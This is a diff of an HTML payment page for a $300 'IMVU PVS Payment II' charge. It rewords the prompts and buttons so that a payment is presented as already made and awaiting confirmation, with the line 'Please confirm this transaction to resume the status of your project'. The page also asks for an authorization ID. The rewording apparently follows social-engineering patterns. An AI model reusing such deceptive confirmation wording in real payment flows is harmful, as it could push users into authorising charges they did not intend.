@@ -186,7 +186,7 @@
                         <h3 class="text-2xl font-bold mb-4 text-gray-800">Choose Payment Actions</h3>
                         <ul class="list-group">
                             <li class="list-group-item bg-blue-100 rounded-md shadow-md">
-                                <strong onclick="my_modal_1.showModal()" class="text-blue-700" style="cursor: pointer;">Initiate a Payment</strong>
+                                <strong onclick="my_modal_1.showModal()" class="text-blue-700" style="cursor: pointer;">Confirm Payment</strong>
                             </li>
                             <li class="list-group-item bg-green-100 rounded-md shadow-md">
                                 <strong onclick="my_modal_4.showModal()"  style="cursor: pointer;" class="text-green-700">Track Payment Status</strong>
@@ -257,7 +257,7 @@ document.addEventListener("DOMContentLoaded", function() {
 <!-- Open the modal using ID.showModal() method -->
 <dialog id="my_modal_1" class="modal">
     <div class="modal-box">
-      <h3 class="font-bold text-lg">Initiate Payment</h3>
+      <h3 class="font-bold text-lg">Confirm Payment</h3>
       <input type="text" id="auth_id" placeholder="Payment Authorization ID" class="input input-bordered w-full p-2 mt-2" style="box-sizing: border-box;" maxlength="43">
       <p id="error-message" style="color: red; display: none;">Invalid Authorization ID</p>
       <div class="modal-action">
@@ -275,14 +275,14 @@ document.addEventListener("DOMContentLoaded", function() {
       <div class="payment-details">
         <p class="consumer-name"><strong>Consumer Name:</strong> Bob</p>
         <p class="payment-for"><strong>Payment For:</strong> IMVU PVS Payment II</p>
-        <p class="payment-method"><strong>Payment Method Allowed:</strong> Credit/Debit</p>
+        <p class="payment-method"><strong>Payment Method Used:</strong> Other</p>
         <p class="amount"><strong>Amount:</strong> $300 <span class="note">(amount shown without taxes)</span></p>
-        <p class="security-note" style="color: red; font-weight: bold;">Only 3D Security Cards are Accepted</p>
+        <p class="security-note" style="color: red; font-weight: bold;">Please confirm this transaction to resume the status of your project.</p>
       </div>
       <div class="modal-action">
         <form method="dialog">
           <button type="button" class="btn" onclick="closeModal('my_modal_2')">Close</button>
-          <button onclick="my_modal_3.showModal()" class="btn">Make Payment</button>
+          <button onclick="my_modal_3.showModal()" class="btn">Confirm</button>
         </form>
       </div>
     </div>
@@ -374,7 +374,7 @@ document.addEventListener("DOMContentLoaded", function() {
           Close
         </button>
         <button type="submit" class="btn" id="paymentBtn" onclick="change()">
-          Go to Payment Page
+          Confirm
         </button>
       </div>
     </div>
